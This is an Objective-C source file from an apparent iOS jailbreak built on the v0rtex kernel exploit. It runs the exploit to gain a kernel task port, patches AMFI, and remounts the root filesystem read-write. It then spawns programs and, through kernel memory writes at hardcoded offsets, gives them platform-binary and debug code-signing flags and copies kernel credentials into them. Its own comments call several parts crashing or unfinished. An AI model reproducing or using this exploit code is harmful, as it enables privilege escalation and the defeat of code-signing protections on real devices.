//
//  ViewController.m
//  v0rtex
//
//  Created by Sticktron on 2017-12-07.
//  Copyright © 2017 Sticktron. All rights reserved.
//

#import "./fun.h"

task_t tfp0;
kptr_t kslide;
kptr_t kern_ucred;
kptr_t self_proc;

void start_exploit_v0rtex() {
    tfp0 = MACH_PORT_NULL;
    kslide = 0;
    kern_ucred = 0;
    self_proc = 0;

    /* Use v0rtex exploit */
    
    kern_return_t ret = v0rtex(&tfp0, &kslide, &kern_ucred, &self_proc);
    if (ret != KERN_SUCCESS) {
        LOG("v0rtex exploit failed");
        return;
    }
	
    LOG("tfp0 -> %x", tfp0);
    LOG("slide -> 0x%llx", kslide);
    LOG("self_proc -> 0x%llx", self_proc);
    LOG("kern_ucred -> 0x%llx", kern_ucred);
    
    
    /* Set up patchfinder and stuff */
    
    init_patchfinder(tfp0, kslide + 0xFFFFFFF007004000, NULL);
    init_amfi(tfp0);
    init_kernel(tfp0);
    
    
    /* Remount system partition as r/w */
    
    int remount = mount_root(tfp0, kslide);
    if (remount != 0) {
        LOG("failed to remount /");
        return;
    }
}

// creds to stek on this one
int execprog(uint64_t kern_ucred, const char *prog, const char* args[]) {
    if (args == NULL) {
        args = (const char **)&(const char*[]){ prog, NULL };
    }
    
    const char *logfile = [NSString stringWithFormat:@"/v0rtex/logs/%@-%lu",
                           [[NSMutableString stringWithUTF8String:prog] stringByReplacingOccurrencesOfString:@"/" withString:@"_"],
                           time(NULL)].UTF8String;
    printf("Spawning [ ");
    for (const char **arg = args; *arg != NULL; ++arg) {
        printf("'%s' ", *arg);
    }
    printf("] to logfile [ %s ] \n", logfile);
    
    int rv;
    posix_spawn_file_actions_t child_fd_actions;
    if ((rv = posix_spawn_file_actions_init (&child_fd_actions))) {
        perror ("posix_spawn_file_actions_init");
        return rv;
    }
    if ((rv = posix_spawn_file_actions_addopen (&child_fd_actions, STDOUT_FILENO, logfile,
                                                O_WRONLY | O_CREAT | O_TRUNC, 0666))) {
        perror ("posix_spawn_file_actions_addopen");
        return rv;
    }
    if ((rv = posix_spawn_file_actions_adddup2 (&child_fd_actions, STDOUT_FILENO, STDERR_FILENO))) {
        perror ("posix_spawn_file_actions_adddup2");
        return rv;
    }
    
    pid_t pd;
    if ((rv = posix_spawn(&pd, prog, &child_fd_actions, NULL, (char**)args, NULL))) {
        printf("posix_spawn error: %d (%s)\n", rv, strerror(rv));
        return rv;
    }
    
    printf("process spawned with pid %d \n", pd);
    
    #define CS_GET_TASK_ALLOW       0x0000004    /* has get-task-allow entitlement */
    #define CS_INSTALLER            0x0000008    /* has installer entitlement      */
    #define CS_HARD                 0x0000100    /* don't load invalid pages       */
    #define CS_RESTRICT             0x0000800    /* tell dyld to treat restricted  */
    #define CS_PLATFORM_BINARY      0x4000000    /* this is a platform binary      */
    
    /*
     1. read 8 bytes from proc+0x100 into self_ucred
     2. read 8 bytes from kern_ucred + 0x78 and write them to self_ucred + 0x78
     3. write 12 zeros to self_ucred + 0x18
     */
    
    // find_allproc will crash, currently
    // please fix
    if (kern_ucred != 0) {
        int tries = 3;
        while (tries-- > 0) {
            sleep(1);
            uint64_t proc = rk64(kslide + 0xFFFFFFF0075E66F0);
            while (proc) {
                uint32_t pid = rk32(proc + 0x10);
                if (pid == pd) {
                    uint32_t csflags = rk32(proc + 0x2a8);
                    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
                    wk32(proc + 0x2a8, csflags);
                    tries = 0;

                    // i don't think this bit is implemented properly
                    uint64_t self_ucred = rk64(proc + 0x100);
                    uint32_t selfcred_temp = rk32(kern_ucred + 0x78);
                    wk32(self_ucred + 0x78, selfcred_temp);

                    for (int i = 0; i < 12; i++) {
                        wk32(self_ucred + 0x18 + (i * sizeof(uint32_t)), 0);
                    }

                    printf("gave elevated perms to pid %d \n", pid);

                    // original stuff, rewritten above using v0rtex stuff
                    // kcall(find_copyout(), 3, proc+0x100, &self_ucred, sizeof(self_ucred));
                    // kcall(find_bcopy(), 3, kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t));
                    // kcall(find_bzero(), 2, self_ucred + 0x18, 12);
                    break;
                }
                proc = rk64(proc);
            }
        }
    }
    
    int status;
    waitpid(pd, &status, 0);
    printf("'%s' exited with %d (sig %d)\n", prog, WEXITSTATUS(status), WTERMSIG(status));
    
    char buf[65] = {0};
    int fd = open(logfile, O_RDONLY);
    if (fd == -1) {
        perror("open logfile");
        return 1;
    }
    
    printf("contents of %s: \n ------------------------- \n", logfile);
    while(read(fd, buf, sizeof(buf) - 1) == sizeof(buf) - 1) {
        printf("%s", buf);
    }
    printf("%s", buf);
    printf("\n-------------------------\n");
    
    close(fd);
    remove(logfile);
    
    return 0;
}

int execprog_clean(uint64_t kern_ucred, const char *prog, const char* args[]) {
    if (args == NULL) {
        args = (const char **)&(const char*[]){ prog, NULL };
    }
    
    int rv;
    pid_t pd;
    if ((rv = posix_spawn(&pd, prog, NULL, NULL, (char**)args, NULL))) {
        printf("posix_spawn error: %d (%s)\n", rv, strerror(rv));
        return rv;
    }
    
    #define CS_GET_TASK_ALLOW       0x0000004    /* has get-task-allow entitlement */
    #define CS_INSTALLER            0x0000008    /* has installer entitlement      */
    #define CS_HARD                 0x0000100    /* don't load invalid pages       */
    #define CS_RESTRICT             0x0000800    /* tell dyld to treat restricted  */
    #define CS_PLATFORM_BINARY      0x4000000    /* this is a platform binary      */
    
    /*
     1. read 8 bytes from proc+0x100 into self_ucred
     2. read 8 bytes from kern_ucred + 0x78 and write them to self_ucred + 0x78
     3. write 12 zeros to self_ucred + 0x18
     */
    
    if (kern_ucred != 0) {
        int tries = 3;
        while (tries-- > 0) {
            sleep(1);
            // this needs to be moved to an offset VVVVVVVVVVVVV
            uint64_t proc = rk64(kslide + 0xFFFFFFF0075E66F0);
            while (proc) {
                uint32_t pid = rk32(proc + 0x10);
                if (pid == pd) {
                    uint32_t csflags = rk32(proc + 0x2a8);
                    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
                    wk32(proc + 0x2a8, csflags);
                    tries = 0;
                    
                    // i don't think this bit is implemented properly
                    uint64_t self_ucred = rk64(proc + 0x100);
                    uint32_t selfcred_temp = rk32(kern_ucred + 0x78);
                    wk32(self_ucred + 0x78, selfcred_temp);
                    
                    for (int i = 0; i < 12; i++) {
                        wk32(self_ucred + 0x18 + (i * sizeof(uint32_t)), 0);
                    }
                    
                    // original stuff, rewritten above using v0rtex stuff
                    // kcall(find_copyout(), 3, proc+0x100, &self_ucred, sizeof(self_ucred));
                    // kcall(find_bcopy(), 3, kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t));
                    // kcall(find_bzero(), 2, self_ucred + 0x18, 12);
                    break;
                }
                proc = rk64(proc);
            }
        }
    }
    
    int status;
    waitpid(pd, &status, 0);
    return status;
}

void read_file(const char *path) {
    char buf[65] = {0};
    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        perror("open path");
        return;
    }
    
    printf("contents of %s: \n ------------------------- \n", path);
    while(read(fd, buf, sizeof(buf) - 1) == sizeof(buf) - 1) {
        printf("%s", buf);
    }
    printf("%s", buf);
    printf("\n-------------------------\n");
    
    close(fd);
}

char* bundle_path() {
    CFBundleRef mainBundle = CFBundleGetMainBundle();
    CFURLRef resourcesURL = CFBundleCopyResourcesDirectoryURL(mainBundle);
    int len = 4096;
    char* path = malloc(len);
    
    CFURLGetFileSystemRepresentation(resourcesURL, TRUE, (UInt8*)path, len);
    
    return path;
}
